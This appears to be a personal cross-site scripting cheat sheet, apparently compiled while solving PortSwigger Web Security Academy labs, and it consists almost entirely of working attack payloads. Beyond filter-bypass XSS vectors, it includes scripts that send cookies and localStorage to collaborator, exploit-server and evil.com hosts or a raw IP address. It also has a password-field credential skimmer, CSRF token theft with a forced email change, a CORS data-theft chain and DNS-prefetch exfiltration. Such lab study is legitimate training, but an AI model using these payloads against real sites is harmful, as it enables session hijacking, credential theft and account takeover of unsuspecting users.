***First View Source***
```
Check input >> <any tag> >>
<svg onload=alert(1)> 
<img src=1 onerror=alert(1)>
#<img src=x onerror=print()>
<><img src=1 onerror=alert(1)>
'-alert(1)-'
{{$on.constructor('alert(1)')()}} #AngularJS double encode
\"-alert(1)}//
<h1><h1 onmouseover="alert(1)">
\'-alert(1)//
${alert(1)}
"}+
```

``JQuery
check href is backlink: javascript:alert(document.cookie)
http://foo?&apos;-alert(1)-&apos;
[] Check source code find Function
```hash
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

``if find input type
```
"onmouseover="alert(1)
```

``DOM XSS CheckStock
```
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
 ```
``Brute Force
Intruder tag with <> >> event <body $$=1>
```
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
***If all tag block use custom_tag***
```
<xss onmouseover='alert("1")>
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

```
<script> location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>
```

***Check url with ? to find Canonical link
```
'accesskey='x'onclick='alert(1)
```

***If any payload can use but not working #viewsource-code
```
</script><script>alert(1)</script>
```

***Href Web***
```
http://foo?&apos;-alert(1)-&apos;
```

***Steal Cookie***
```
<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>

fetch('https://[YOUR-EXPLOIT-SERVER-ID].exploit-server.net/log?cookie=' + btoa(document.cookie))

fetch("https://jg3ypsxqfm9wo3d1li8eqpo3dujl7ev3.oastify.com/?id="+btoa(document.cookie))

<script>
    window.location = "https://0a63004503cda5f7807b8f1b002b004e.web-security-academy.net/?SearchTerm=[YOUR_ENCODED_XSS_PAYLOAD]";
</script>

<script>
    window.location = "https://0a63004503cda5f7807b8f1b002b004e.web-security-academy.net/?SearchTerm=%22%7d%2dfetch%28%27https%3a%2f%2fexploit%2d0a5c001303e2a58280d08e3d01f3001d%2eexploit%2dserver%2enet%2flog%3fid%3d%27%2bbtoa%28document%2ecookie%29%29%2f%2f";
</script>
```
```
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/my-account/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com') };
</script>

'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID

<img src=x onerror=\"fetch('api/admin/tickets/3/replies',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+localStorage.getItem('token')},body:JSON.stringify({message:localStorage.getItem('token')})})\">
```

***Bypass***
email validate > foo@gmail.com"><img src=x onerror=alert(1)>
https://YOUR-LAB-ID.web-security-academy.net/my-account?email=<img src onerror=alert(1)>
go exploit server >> 
```
https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</button>
```
```
https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>
```
```
<script>
  fetch('https://YOUR_ID.oastify.com/?flag=' + btoa(JSON.stringify(localStorage)));
</script>

<img src=x onerror="fetch('https://YOUR_ID.oastify.com/?f='+btoa(JSON.stringify(localStorage)))">

**redirect
<img src=x onerror="window.location.href='https://YOUR-ID.oastify.com/?f='+btoa(JSON.stringify(localStorage))">

**dns prefecth
<script>
  var flag = btoa(JSON.stringify(localStorage)).substring(0, 30);
  var link = document.createElement('link');
  link.rel = 'dns-prefetch';
  link.href = '//' + flag + '.YOUR-ID.oastify.com';
  document.head.appendChild(link);
</script>

```

```
<body>
<script>
// Define the URLs for the lab environment and the exploit server.
const academyFrontend = "https://0a61009004d3c92282f07e9800e100b7.web-security-academy.net/";
const exploitServer = "https://exploit-0aa80034045ec9ae821c7d1e0139000f.exploit-server.net/exploit";
// Extract the CSRF token from the URL.
const url = new URL(location);
const csrf = url.searchParams.get('csrf');
// Check if a CSRF token was found in the URL.
if (csrf) {
// If a CSRF token is present, create dynamic form elements to perform the attack.
const form = document.createElement('form');
const email = document.createElement('input');
const token = document.createElement('input');
// Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
token.name = 'csrf';
token.value = csrf;
// Configure the new email address intended to replace the user's current email.
email.name = 'email';
email.value = 'hacker@evil-user.net';
// Set the form attributes, append the form to the document, and configure it to automatically submit.
form.method = 'post';
form.action = `${academyFrontend}my-account/change-email`;
form.append(email);
form.append(token);
document.documentElement.append(form);
form.submit();
// If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
} else {
location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```

***CORS with XSS
```
<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
```
``User-agent xss
```
"/><script>alert(1)</script>
```
``Angular XSS
```StealCookie
{{$on.constructor("new Image().src='http://evil.com/log?cookie='+document.cookie")()}}
```
```DataExfiltration
{{$on.constructor("fetch('http://3.26.153.102/data', {method:'POST', body:document.body.innerText})")()}}
```
```CSRF
{{$on.constructor("fetch('/admin/change-password', {method:'POST', body:'new-password=pwned123&confirm=pwned123'})")()}}
```